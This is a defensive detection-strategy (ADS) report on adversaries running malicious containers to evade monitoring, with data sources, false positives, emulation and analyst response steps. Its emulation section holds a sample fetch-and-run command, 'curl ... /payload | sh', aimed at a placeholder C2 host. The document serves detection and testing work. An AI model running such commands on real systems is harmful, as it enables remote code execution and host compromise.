# Alerting & Detection Strategy (ADS) Report

## Goal

## Strategy Abstract
The detection strategy utilizes a combination of network traffic analysis and host-level monitoring to identify suspicious container activity. Key data sources include:
- **Container logs:** Analyzing access patterns and command execution within containers.
- **Network traffic:** Monitoring for unusual outbound connections that may indicate exfiltration attempts or communication with C2 servers.
- **System integrity checks:** Detecting unexpected changes in system files or configurations within the host environment.

Patterns analyzed include:
- Unusual spikes in container creation/deletion activities.
- Abnormal network behavior originating from containers, such as traffic to uncommon ports or destinations.
- Execution of scripts or commands commonly associated with credential harvesting.

## Technical Context
Adversaries may use containers to run malicious code while evading detection by traditional security tools that are not optimized for container environments. Containers provide a lightweight and isolated environment for running applications, which can be exploited to mask the presence of malware.

### Adversary Emulation Details:
- **Sample Commands:**
  - `docker run --rm -it <malicious_image>`
  - `curl -s http://<c2_server>/payload | sh`
- **Test Scenarios:**
  - Deploy a benign container with logging enabled and simulate abnormal network activity to assess detection.
  - Create multiple containers in rapid succession to mimic adversarial behavior.

## Blind Spots and Assumptions
- **Blind Spots:** Detection may not fully cover sophisticated adversaries using advanced obfuscation techniques within containers. 
- **Assumptions:** Assumes the container runtime environment is under monitoring and that logs are properly configured and accessible.
- **Gaps:** Limited visibility into encrypted or highly obfuscated network traffic.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate use of containers for testing or development purposes, leading to high creation/deletion rates.
- Routine updates or maintenance tasks involving containerized applications.
- Network scanning tools running within authorized environments for security assessments.

## Priority
**Severity: Medium**

Justification: While the misuse of containers can significantly impact security posture by enabling adversaries to bypass detection, many organizations have existing measures that can partially mitigate these risks. The medium priority reflects the need to balance between detecting genuine threats and minimizing false positives.

## Validation (Adversary Emulation)
Step-by-step instructions to emulate this technique in a test environment:
1. **Setup Test Environment:**
   - Install Docker or another container runtime on the host system.
   - Configure network monitoring tools to capture traffic from containers.
2. **Deploy Malicious Container:**
   - Pull a benign image and modify it to simulate malicious activity (e.g., add scripts that generate unusual network traffic).
3. **Execute Adversarial Commands:**
   - Run commands within the container that mimic adversarial behavior, such as connecting to an external server.
4. **Monitor Alerts:**
   - Observe detection systems for alerts triggered by the test activities.

## Response
Guidelines for analysts when the alert fires:
1. **Verify Alert:** Confirm the legitimacy of the alert by reviewing container logs and network traffic associated with the flagged activity.
2. **Contain Threat:** Isolate affected containers to prevent further malicious actions. Consider stopping or removing suspicious containers.
3. **Investigate:** Conduct a thorough investigation to determine the scope of the threat, including any potential data exfiltration or system compromise.
4. **Remediate:** Apply necessary security patches or configurations to mitigate vulnerabilities exploited by adversaries.
5. **Document Findings:** Record details of the incident and response actions for future reference and improvement of detection strategies.
